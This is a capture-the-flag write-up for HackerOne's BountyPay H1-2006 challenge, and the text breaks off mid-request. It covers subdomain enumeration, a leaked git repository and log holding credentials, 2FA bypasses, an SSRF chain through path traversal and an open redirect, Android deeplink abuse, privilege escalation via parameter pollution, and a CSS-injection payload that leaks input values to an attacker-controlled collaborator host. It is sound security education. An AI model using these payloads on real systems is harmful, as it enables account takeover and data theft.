activities.markdown_message:
H1-2006 CTF Writeup

TL;DR

I will be explaining in detail the steps I took and the way I think to solve this CTF.
The CTF began with a tweet including a link to the program page: https://hackerone.com/h1-ctf

Recon:

Checking the scope of the CTF, we find that it has a wild card subdomain so basically we need to do some recon in order to kick this off, Awesome!
First we need to do sub-domain enumeration as we have a wildcard, so running Sublist3r should do the trick!
sublist3r -d bountypay.h1ctf.com

So we got 4 subdomains and the main domain. The next step I do here (Since this simulates real-life bug hunting scenarios) is that I run dirsearch/ffuf on all of the subdomains and while it is running, I start checking the subdomains manually. Okay let's get this started.
ffuf -c -w mywordlist.txt -u https://subdomain.domain.com/FUZZ

Checking the subdomains manually I noted the following:

  1. software subdomain is restricted from our IP address so we can't access it publicly. (This hints for the existence of either a mis-configured server that allows "X-Forwarded-For" header with malicious IP or a SSRF)
  2. app and staff subdomains have login forms (We probably are going to need some credentials before getting here)
  3. api subdomain has an open-redirect vulnerability at "https://api.bountypay.h1ctf.com/redirect?url=https://app.bountypay.h1ctf.com" with whitelisted URIs (subdomains of bountypay.h1ctf.com)

Having that noted, lets return to see the result of the directory brute-force. A juicy result was that:
http://app.bountypay.h1ctf.com/.git/HEAD

A leaked .git repository, who can wish for something better! So right now we need to dump that repository and the easiest way to do it is use GitDumper
./gitdumper.sh https://app.bountypay.h1ctf.com/.git/ ~/H1CTF/

Okay, not what I was expecting that many files are corrupt. However, normally the repository link exists in the config file so why not check this out?

https://github.com/bounty-pay-code/request-logger.git
On visiting the repository URL, we find a php file called "logger.php" with the following code:

<?php

$data = array(
  'IP'        =>  $_SERVER["REMOTE_ADDR"],
  'URI'       =>  $_SERVER["REQUEST_URI"],
  'METHOD'    =>  $_SERVER["REQUEST_METHOD"],
  'PARAMS'    =>  array(
      'GET'   =>  $_GET,
      'POST'  =>  $_POST
  )
);

file_put_contents('bp_web_trace.log', date("U").':'.base64_encode(json_encode($data))."\n",FILE_APPEND   );

So basically this is a file that logs requests sent to the application and saves them in bp_web_trace.log file, maybe we get our credentials there?
Visiting http://app.bountypay.h1ctf.com/bp_web_trace.log gives us the leaked log file and it looks like this:

1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==

Decoding those values from Base64 gives us the next clue:

1588931909:{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
1588931919:{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
1588931928:{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
1588931945:{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}

We got leaked credentials of user brian.oliver with password V7h0inzX on the app subdomain.

2FA Bypass (Number One):

The euphoria of finding leaked credentials never ceases to amaze anyone. Quickly logging in to app subdomain with the leaked credentials, we face an obstacle which is a Two-Factor-Authentication. This bypass was relatively easy compared to the other bypass in the end of the CTF.
On sending a random code while intercepting, we get the following request:

POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
Connection: close
Content-Length: 109
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://app.bountypay.h1ctf.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

username=brian.oliver&password=V7h0inzX&challenge=6224cdec018cae455ab17c851bc2c350&challenge_answer=123456789

It seems like he is sending both the challenge and the answer to it in the same request! We already have a challenge answer from the leaked log file, all we need to do is figure out the challenge hash.
Running it against an online hash identifier, we know now it is MD5 hash, so we need to encrypt the leaked challenge answer to MD5 and send it in the challenge parameter along with the answer itself in the challenge_answer parameter.

Md5(bD83Jk27dQ) = 5828c689761cce705a1c84d9b1a1ed5e
So the request parameters would be:
username=brian.oliver&password=V7h0inzX&challenge=5828c689761cce705a1c84d9b1a1ed5e&challenge_answer=bD83Jk27dQ

and.. BINGO! we got access to the account.

Note: You don't need to use that same challenge answer that was leaked. You can encode any value you want to MD5 and send that encoded value and plain text value and you will still bypass 2FA as the back-end only checks whether or not the hash is the md5 of the answer.

Server-Side Request Forgery:

Okay now we have an account on the app subdomain, the first thing to do is start surfing for different features/functions on that account. The one we are presented with is fetching Transactions to Process.

Checking the burp proxy history, apparently that function issues a request to the api subdomain that looks like this:

Remember that open redirect that we noted earlier during the recon stage? This automatically came into mind when I saw that response. Great! but how can I take control of the API request itself?
The only parameters here in the request are the GET parameters and the Cookie which is B64 Encoded. On decoding the cookie we get this:

{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}

So maybe an IDOR here would work in our benefit? and so It was. After changing the account_id parameter in the cookie to Batee5a, I found the following response:

{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/Batee5a\/statements?month=05&year=2020","data":"[\"Invalid Account ID\"]"}

Okay so now I can control the URL path. I immediately go back to get that open redirect path on the api subdomain and craft the following payload:

{"account_id":"Batee5a/../../../redirect?url=https://software.bountypay.h1ctf.com/#","hash":"de235bffd23df6995ad4e0930baac1a2"}

Payload Explanation:
Batee5a/../../../ part is using path traversal to get back to the beginning of the URL
redirect?url=https://software.bountypay.h1ctf.com/ is making use of the open-redirect vulnerability to access the software subdomain which we had no prior access to
# part is to ignore everything after that url, because it automatically appends statements?month=05&year=2020 to our requests but we don't need that in our path.

I encoded that to B64 and sent the request hoping for the best, and it was surely the best!

We got access to the software subdomain! but not so fast, this is another post login form but this time we won't be able to interact with it as we only control the URL, so what to do? yes you thought it right, directory bruteforce! but doing so manually would take forever so scripting is the way.

I fired up python quickly and wrote the following code to brute-force:

#!/usr/bin/python3

import requests
import sys
import base64
requests.packages.urllib3.disable_warnings()

if len(sys.argv) != 2 :
    print("## Usage: python3 bruteforce.py [WORDLIST].txt")
    print("E.G. python3 bruteforce.py directory.txt")
    sys.exit(1)

siteURL = "https://app.bountypay.h1ctf.com/statements?month=01&year=2020"

paths = open(sys.argv[1]).read().splitlines()

for line in paths:
    cookie = '{"account_id":"../../redirect?url=https://software.bountypay.h1ctf.com/'+line+'#","hash":"de235bffd23df6995ad4e0930baac1a2"}'
    cookie1 = cookie.encode('ascii')
    cookies = base64.b64encode(cookie1)
    loginHeaders = {"Cookie":"token="+str(cookies).split("'")[1]}
    checkDirectory = requests.get(siteURL, headers = loginHeaders, verify = False)
    if ("404 Not Found") not in checkDirectory.text:
        print("[+] Valid Directory Found: ", line)

paths.close()

I was basically looking for any directory that would not return 404 Not Found in its response. Executing this script resulted in a wonderful directory that is our next challenge.

Checking this directory manually, gave us the link to our next challenge:

https://software.bountypay.h1ctf.com/uploads/BountyPay.apk
Lets get onto hacking with APK!

Android Challenges:

I had so much fun solving these challenges, probably because this was my first time ever to interact with an APK that wasn't designed to be vulnerable such as DIVA, etc.. But enough with the pip-talk, lets get down to business.

After downloading the APK, I started decompiling it to get to human-readable Java code as well as installing it on my android emulator.

Extracting DeepLinks:

After running it, I got a prompt to put my username and my twitter handle. On submitting those I got a blank page with an icon on the bottom right that gives two hints: (Deeplinks, Params.) and title (PartOneActivity)
I did not have a clue what Deeplinks are, so I started googling and figured out that Deeplinks are defined in the AndroidManifest.xml file, they are used to direct users to a specific part of your application and they look like this:

<activity
    android:name=".ui.activities.MyActivity"
    android:label="@string/title_activity"
    android:screenOrientation="portrait">
    <!-- ATTENTION: This intent was auto-generated. Follow instructions at
    https://g.co/AppIndexing/AndroidStudio to publish your Android app deep links. -->
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />

        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <!-- ATTENTION: This data URL was auto-generated. We recommend that you use the HTTP scheme.
        TODO: Change the host or pathPrefix as necessary. -->
        <data
            android:host="myHost"
            android:scheme="myCustomScheme" />
    </intent-filter>
</activity>

Also, if you want to call them with parameters (As said in the hint), you can use ADB easily like this:
adb shell am start -W -a android.intent.action.VIEW -d "myCustomScheme://myHost?key=category_parent_id\&value=92\&title=test" com.myApp.android

Okay awesome! Now all we need is to extract the deeplink schemas from the AndroidManifest.xml file and to find out what parameters we need. The first part is easy, on checking the AndroidManifest.xml file we get that we have three deeplinks for each of the Activities present in the application:

<activity android:theme="@style/AppTheme.NoActionBar" android:label="@string/title_activity_part_three" android:name="bounty.pay.PartThreeActivity">
            <intent-filter android:label="">
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
                <data android:scheme="three" android:host="part" />
            </intent-filter>
        </activity>
        <activity android:theme="@style/AppTheme.NoActionBar" android:label="@string/title_activity_part_two" android:name="bounty.pay.PartTwoActivity">
            <intent-filter android:label="">
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
                <data android:scheme="two" android:host="part" />
            </intent-filter>
        </activity>
        <activity android:theme="@style/AppTheme.NoActionBar" android:label="@string/title_activity_part_one" android:name="bounty.pay.PartOneActivity">
            <intent-filter android:label="">
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
                <data android:scheme="one" android:host="part" />
            </intent-filter>
        </activity>

Alright, now for some source code review.

PartOneActivity:

This part is simple and straight-forward. Checking out the PartOneActivity.java (F851216), we find the following snippet:

if (this.getIntent() != null && this.getIntent().getData() != null && (string2 = this.getIntent().getData().getQueryParameter("start")) != null && string2.equals((Object)"PartTwoActivity") && object.contains("USERNAME")) {
            string2 = object.getString("USERNAME", "");
            SharedPreferences.Editor editor = object.edit();
            object = object.getString("TWITTERHANDLE", "");
            editor.putString("PARTONE", "COMPLETE").apply();
            this.logFlagFound(string2, (String)object);
            this.startActivity(new Intent((Context)this, PartTwoActivity.class));
        }

So basically we need two have one parameter called start with the value PartTwoActivity so that we can satisfy this If-Condition and start the PartTwoActivity. We can do this by sending the following command:

adb shell am start -W -a android.intent.action.VIEW -d "one://part?start=PartTwoActivity" bounty.pay

and now we are directly into the second activity.

PartTwoActivity:

This one is divided into two parts. We get a blank screen here as well but on checking the PartTwoActivity.java (F851218) we get two If-Conditions that need to be satisfied to finish this stage.
First IF-Condition is here:

if (this.getIntent() != null && this.getIntent().getData() != null) {
            Object object2 = this.getIntent().getData();
            object = object2.getQueryParameter("two");
            object2 = object2.getQueryParameter("switch");
            if (object != null && object.equals((Object)"light") && object2 != null && object2.equals((Object)"on")) {
                bundle.setVisibility(0);
                button.setVisibility(0);
                textView.setVisibility(0);
            }
        }

I am not an expert on Java, but it seems that some elements become visible if we satisfy this condition. Which is fairly easy because this is similar to part one activity which requires us to send a deeplink with two parameters (two, switch) which have the following values (light, on). So we send this immediately:

adb shell am start -W -a android.intent.action.VIEW -d "two://part?two=light\&switch=on" bounty.pay

And now we got a text box, a button, and a hash.

Continuing with the source code, we find the following snippet for the second If-Condition:

public void onDataChange(DataSnapshot dataSnapshot) {
                String string2 = (String)dataSnapshot.getValue();
                Object object = PartTwoActivity.this.getSharedPreferences("user_created", 0);
                dataSnapshot = object.edit();
                String string3 = this.val$post;
                StringBuilder stringBuilder = new StringBuilder();
                stringBuilder.append("X-");
                stringBuilder.append(string2);
                if (string3.equals((Object)stringBuilder.toString())) {
                    string2 = object.getString("USERNAME", "");
                    object = object.getString("TWITTERHANDLE", "");
                    PartTwoActivity.this.logFlagFound(string2, (String)object);
                    dataSnapshot.putString("PARTTWO", "COMPLETE").apply();
                    PartTwoActivity.this.correctHeader();
                    return;
                }
                Toast.makeText((Context)PartTwoActivity.this, (CharSequence)"Try again! :D", (int)0).show();
            }

So our input should start with X- and appended with the value of string2 whichever that value is. But its weird that we have a hash printed out? Getting back to that hash and trying to decrypt it, it appears that this hash is MD5. Using an online MD5 decrypt tool, we get its real value which is Token

It makes sense, lets try that as our input to be X-Token and voi la! we are now into PartThreeActivity.

PartThreeActivity:

We got a blank page like the previous activity, but we know now that they become visible with the right deeplink query with the right parameters, so lets check the source code for PartThreeActivity.java (F851217)

if (this.getIntent() != null && this.getIntent().getData() != null) {
            Object object3 = this.getIntent().getData();
            object = object3.getQueryParameter("three");
            object2 = object3.getQueryParameter("switch");
            object3 = object3.getQueryParameter("header");
            Object object4 = Base64.decode((String)object, (int)0);
            Object object5 = Base64.decode((String)object2, (int)0);
            object4 = new String((byte[])object4, StandardCharsets.UTF_8);
            object5 = new String((byte[])object5, StandardCharsets.UTF_8);
            this.childRefThree.addListenerForSingleValueEvent(new ValueEventListener((String)object, (String)object4, (String)object2, (String)object5, (String)object3, (EditText)bundle, button){
                final /* synthetic */ Button val$button;
                final /* synthetic */ String val$decodedFirstParam;
                final /* synthetic */ String val$decodedSecondParam;
                final /* synthetic */ EditText val$editText;
                final /* synthetic */ String val$firstParam;
                final /* synthetic */ String val$secondParam;
                final /* synthetic */ String val$thirdParam;
                {
                    this.val$firstParam = string2;
                    this.val$decodedFirstParam = string3;
                    this.val$secondParam = string4;
                    this.val$decodedSecondParam = string5;
                    this.val$thirdParam = string6;
                    this.val$editText = editText;
                    this.val$button = button;
                }

                [@Override](/override)
                public void onDataChange(DataSnapshot object) {
                    String string2;
                    object = (String)object.getValue();
                    if (this.val$firstParam != null && this.val$decodedFirstParam.equals((Object)"PartThreeActivity") && this.val$secondParam != null && this.val$decodedSecondParam.equals((Object)"on") && (string2 = this.val$thirdParam) != null) {
                        StringBuilder stringBuilder = new StringBuilder();
                        stringBuilder.append("X-");
                        stringBuilder.append((String)object);
                        if (string2.equals((Object)stringBuilder.toString())) {
                            this.val$editText.setVisibility(0);
                            this.val$button.setVisibility(0);
                            PartThreeActivity.this.thread.start();
                        }
                    }
                }
            });
        }

This was quite tricky at first, especially that I know nothing about Java. But reading and googling is always the answer.
We need to send the deeplink query with 3 parameters (three, switch, header), on checking what those parameter values should be, we get that the first two of them are supposed to be Base64Encoded from the following lines:

            Object object4 = Base64.decode((String)object, (int)0);
            Object object5 = Base64.decode((String)object2, (int)0);

Their decoded value also should be equal (PartThreeActivity) and (on), okay good so thats two down and one to go.
The third parameter was the easiest to get actually as it had the same check on the second part of PartTwoActivity which is related to the stringBuilder part of the code.

So we craft the following command:
adb shell am start -W -a android.intent.action.VIEW -d "three://part?three=UGFydFRocmVlQWN0aXZpdHk=\&switch=b24=\&header=X-Token" bounty.pay

And we get the following screen:

There is a leaked hash somewhere and we need to submit it! I reproduced the steps while intercepting with burpsuite but nothing was leaked there.. maybe it was leaked locally?
I quickly opened up an adb shell and navigated to /data/data/bounty.pay/shared_prefs/ and fetched user_created.xml and I was correct! the hash was leaked there!

We submit that leaked hash and get congratulated for finishing the APK challenges. That was the first, most fun part of this CTF to me.

Okay so now we got:

  1. Hash: 8e9998ee3137ca9ade8f372739f062c1
  2. Header: X-Token
  3. Host: http://api.bountypay.h1ctf.com

We know now whats our next step, let's get some coffee and continue.

API Misconfiguration + OSINT:

During my coffee break and checking out twitter for new hints, I found out that @BountyPayHQ got a new staff employee, Sandra Allison
Her staff ID is also exposed on a photo she posted, well surely this will come in handy during some part of the CTF, so lets keep that noted on the side.

With my new X-Token hash, I started brute-forcing API methods to find hidden methods as there is no documentation for the API. It wasn't so long until I reached this endpoint:

https://api.bountypay.h1ctf.com/api/staff

It had the following response:

Weird right? we got two staff accounts, but remember Sandra from twitter? she is not here..
For those of you who don't know that, when testing APIs its best that you bruteforce methods by using both GET and POST requests, chances are a mis-configuration is present and you can also add/edit data if you found a valid method.
Sending a POST request to the same endpoint resulted in a different response this time:

Missing Parameter

Awesome! So now we need to brute-force parameters to add our account, well not actually brute-force parameters its pretty obvious we need to use the staff_id parameter with Sandra's leaked staff ID so sending the following request gets us what we want.

POST /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
X-Token: 8e9998ee3137ca9ade8f372739f062c1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

staff_id=STF:8FJ3KFISL3

Sandra Allison's Staff account credentials.

Username: sandra.allison
Password: s%3D8qB8zEpMnc*xsz7Yp5

Privilege Escalation:

Alright, time for our next sub-domain fun! Getting to staff subdomain and logging in with the above credentials allowed us to get to the next step of the CTF, we see this screen:

We have 4 tabs, which are (Home, Support Tickets, Profile, Logout) and a Report this Page on the bottom. So let's start playing with them:

  1. The Support Ticket tab shows us a demo ticket sent from the admin and it looks like this:

  1. The Profile tab shows us our profile name and avatar, we also have the ability to change those

  1. The report page button on the bottom sends the current page URL to the admin to check it out. However, it ignores pages that are in the admin path because of security.

At first I thought this was going to be a blind self-XSS. Where I find a self-stored xss and then send the page to the admin to check it out so I started tampering immediately with the profile name and avatar but it seemed to be pretty-well filtered, the avatar value especially caught my attention as it was being reflected inside a class attribute and I couldn't escape it.. maybe I missed something?

Going back to check the javascript files on the portal, I found something interesting..

$(".upgradeToAdmin").click(function() {
    let t = $('input[name="username"]').val();
    $.get("/admin/upgrade?username=" + t, function() {
        alert("User Upgraded to Admin")
    })
}), $(".tab").click(function() {
    return $(".tab").removeClass("active"), $(this).addClass("active"), $("div.content").addClass("hidden"), $("div.content-" + $(this).attr("data-target")).removeClass("hidden"), !1
}), $(".sendReport").click(function() {
    $.get("/admin/report?url=" + url, function() {
        alert("Report sent to admin team")
    }), $("#myModal").modal("hide")
}), document.location.hash.length > 0 && ("#tab1" === document.location.hash && $(".tab1").trigger("click"), "#tab2" === document.location.hash && $(".tab2").trigger("click"), "#tab3" === document.location.hash && $(".tab3").trigger("click"), "#tab4" === document.location.hash && $(".tab4").trigger("click"));

an upgradeToAdmin function that is being selected via a class JQuery selector? this can't be a coincidence! At this step I automatically knew that the privilege escalation bug had something to do with this, but it isn't an easy peasy task yet.

For us to successfully accomplish this privilege escalation, we need the admin to view a page that has our custom made avatar (With the value of upgradeToAdmin in it), an input field with name username and value of our username sandra.allison and also to automatically click on our avatar once he opens that page, at first it seemed like an impossible thing to do but thank god for HTTP Parameter Pollution!

The staff portal renders its pages with the use of ?template=home parameter, if you are on the login it would be ?template=login, if you are on the tickets page the parameter would be ?template=ticket&ticket_id=3582
Replicating that parameter multiples times after converting it to an array allows us to have multiple pages on the same page, so basically if we did ?template[]=login&template[]=ticket&ticket_id=3582 we would end up with the following page:

Cool, huh? so basically what we need now is to pre-set the username input to our username, and automatically make the admin click on our avatar after visiting the page. Easy Peasy!
By sending an extra GET parameter called username and setting it to sandra.allison, the value of the username input gets changed automatically. Also, by checking out the last part of the javascript code, we can easily find out how to automate the clicking of our avatar by simply adding an extra tab tab3 to our avatar payload and append #tab3 to our location hash that is being sent to admin. As it appears that if the page has a location hash, it gets checked against that last part of the javascript code and if it is valid, it gets triggered with a click.

So the final avatar payload should look like this:

profile_name=sandra&profile_avatar=upgradeToAdmin%20tab%20tab3

and since the report function takes a B64 encoded URL path, this will be the final decoded payload:

/?template[]=login&username=sandra.allison&template[]=ticket&ticket_id=3582#tab3

By quickly encoding the previous payload to B64 and sending it to the admin using the following request:

GET /admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyI3RhYjM= HTTP/1.1
Host: staff.bountypay.h1ctf.com
Connection: close
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
X-Requested-With: XMLHttpRequest
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://staff.bountypay.h1ctf.com//?template[]=login&username=sandra.allison&template[]=ticket&ticket_id=3582
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOVM5N0IvVGtnM2g3TmhWU0lENlV5WVJLRHlmRlZLMEQ0SUVPbGZJdGE5MTlGcUJDYVJqQUVkYllMa0NvQ3lRK1FHaWZKQnJqM0JraCt0a1JXOERtcjZxRUhmYUl1NmZIQU9FeXVlWnVDUEsrUVZVVllnYy8zMXFnbmFlT3Y4Zm80Q0M0PQ%3D%3D

Refreshing the page gives us a wonderful delight!

Its right there! marten.mickos account and password! is it over? little did I know..

2FA Bypass (Number Two: Data Exfiltration through CSS Injection):

We got the credentials, lets get back ASAP to the app subdomain and login with them! On logging in we face a 2FA but hey! we bypassed that earlier (Remember with Brian Oliver? MD5 the answer and sending it as challenge) so that wasn't a problem for us. We then fetch the transactions for May which is the whole point of the CTF is to pay hackers their bounties, a button named Pay is right there this is it! but unfortunately, another 2FA pops up, and its not like the first one..

On sending the 2FA challenge, I saw a weird request being sent in the burp history, it was sending a POST request with an app_style parameter that contained a CSS file. At this point I said to myself "Yes, This is CSS Injection but I don't know anything about that!"

I started googling about it and found some pretty interesting write-ups and here is what I understood from it:

In a nutshell, CSS allows the user to select tags and apply styles to them. So, If an attacker controls the CSS of the page he can do something like:

input[value^=a]{background:url("https://attacker.host/this.starts.with.a");}

Which basically allows the attacker to fetch the number of input fields that their value starts with an 'a'. You can read more here on the CSS attribute selectors

But this is completely blind! I don't even know the input names I need to fetch so that would be the first step to do.
Working with the same concept of the previous example, I quickly opened up my free hosting to upload a custom made CSS file that looked like this:

input[name^="a"]{background:url("https://q8z2p25qkaqmu2hteee6dxwt5kbhz6.burpcollaborator.net/a_");}
input[name^="b"]{background:url("https://q8z2p25qkaqmu2hteee6dxwt5kbhz6.burpcollaborator.net/b_");}

input[name^="z"]{background:url("https://q8z2p25qkaqmu2hteee6dxwt5kbhz6.burpcollaborator.net/z_");}
input[name^="A"]{background:url("https://q8z2p25qkaqmu2hteee6dxwt5kbhz6.burpcollaborator.net/A_");}
input[name^="B"]{background:url("https://q8z2p25qkaqmu2hteee6dxwt5kbhz6.burpcollaborator.net/B_");}

input[name^="M"]{background:url("https://q8z2p25qkaqmu2hteee6dxwt5kbhz6.burpcollaborator.net/M_");}

input[name^="U"]{background:url("https://q8z2p25qkaqmu2hteee6dxwt5kbhz6.burpcollaborator.net/U_");}
input[name^="V"]{background:url("https://q8z2p25qkaqmu2hteee6dxwt5kbhz6.burpcollaborator.net/V_");}
input[name^="W"]{background:url("https://q8z2p25qkaqmu2hteee6dxwt5kbhz6.burpcollaborator.net/W_");}
input[name^="X"]{background:url("https://q8z2p25qkaqmu2hteee6dxwt5kbhz6.burpcollaborator.net/X_");}
input[name^="Y"]{background:url("https://q8z2p25qkaqmu2hteee6dxwt5kbhz6.burpcollaborator.net/Y_");}
input[name^="Z"]{background:url("https://q8z2p25qkaqmu2hteee6dxwt5kbhz6.burpcollaborator.net/Z_");}
input[name^="1"]{background:url("https://q8z2p25qkaqmu2hteee6dxwt5kbhz6.burpcollaborator.net/1_");}
input[name^="2"]{background:url("https://q8z2p25qkaqmu2hteee6dxwt5kbhz6.burpcollaborator.net/2_");}
input[name^="3"]{background:url("https://q8z2p25qkaqmu2hteee6dxwt5kbhz6.burpcollaborator.net/3_");}
input[name^="4"]{background:url("https://q8z2p25qkaqmu2hteee6dxwt5kbhz6.burpcollaborator.net/4_");}
input[name^="5"]{background:url("https://q8z2p25qkaqmu2hteee6dxwt5kbhz6.burpcollaborator.net/5_");}
input[name^="6"]{background:url("https://q8z2p25qkaqmu2hteee6dxwt5kbhz6.burpcollaborator.net/6_");}
input[name^="7"]{background:url("https://q8z2p25qkaqmu2hteee6dxwt5kbhz6.burpcollaborator.net/7_");}
input[name^="8"]{background:url("https://q8z2p25qkaqmu2hteee6dxwt5kbhz6.burpcollaborator.net/8_");}
input[name^="9"]{background:url("https://q8z2p25qkaqmu2hteee6dxwt5kbhz6.burpcollaborator.net/9_");}
input[name^="0"]{background:url("https://q8z2p25qkaqmu2hteee6dxwt5kbhz6.burpcollaborator.net/0_");}
input[name^="-"]{background:url("https://q8z2p25qkaqmu2hteee6dxwt5kbhz6.burpcollaborator.net/-_");}
input[name^="_"]{background:url("https://q8z2p25qkaqmu2hteee6dxwt5kbhz6.burpcollaborator.net/__");}

So what will this do exactly? It will set a background image (Our burp Collaborator Client) to any input field with a name that starts with anything from that charset. So if there is, for example, an input field with name "challenge", we would get a request to our burp collaborator that looked like this:

GET /c_ HTTP/1.1
Host: q8z2p25qkaqmu2hteee6dxwt5kbhz6.burpcollaborator.net
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/81.0.4044.138 HeadlessChrome/81.0.4044.138 Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://batee5apentest.000webhostapp.com/cssExfil.css
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US

So I uploaded that file to my free hosting, and sent it with the payment request and I did indeed get a request to my collaborator that an input starting with c exists. Great! now lets enumerate more.
By repeating the previous request with a slightly modified payload:

input[name^="ca"]{background:url("https://q8z2p25qkaqmu2hteee6dxwt5kbhz6.burpcollaborator.net/a_");}

As we know the input starts with a c, we need to know the second letter, and so on and so on as each time we prepend the value of the letter we got from the previous request, we ended up with 7 input parameters:

code_1
code_2
code_3
code_4
code_5
code_6
code_7

So now what? Exactly what you are thinking, we need to craft a payload that will fetch us the values of all those input fields at the same request because the challenge answer changes with each request. So basically we need to repeat each line of the previous payload 7 times, once for each input field; also take in mind that the requests will not come in order, so we need to slightly modify the payload to let us know which character comes in which order.

FinalCode.txt (F851202)

Below is an example from each part of the payload:

input[name=code_1][value^="a"]{background:url("https://xz09g9wxbhhtl9805l5d44n0wr2lqa.burpcollaborator.net/a1_");}
input[name=code_2][value^="a"]{background:url("https://xz09g9wxbhhtl9805l5d44n0wr2lqa.burpcollaborator.net/a2_");}
input[name=code_3][value^="a"]{background:url("https://xz09g9wxbhhtl9805l5d44n0wr2lqa.burpcollaborator.net/a3_");}
input[name=code_4][value^="a"]{background:url("https://xz09g9wxbhhtl9805l5d44n0wr2lqa.burpcollaborator.net/a4_");}
input[name=code_5][value^="a"]{background:url("https://xz09g9wxbhhtl9805l5d44n0wr2lqa.burpcollaborator.net/a5_");}
input[name=code_6][value^="a"]{background:url("https://xz09g9wxbhhtl9805l5d44n0wr2lqa.burpcollaborator.net/a6_");}
input[name=code_7][value^="a"]{background:url("https://xz09g9wxbhhtl9805l5d44n0wr2lqa.burpcollaborator.net/a7_");}

Explanation: As you can see, we initially select the input field with the name code_$ and then its value, but in the request to our collaborator, we also configured it to send an additional number depending on the input field number to let us know where does this character belong in the 7 character 2FA code.

Saving this to my hosting and sending the following request:

POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
Connection: close
Content-Length: 69
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
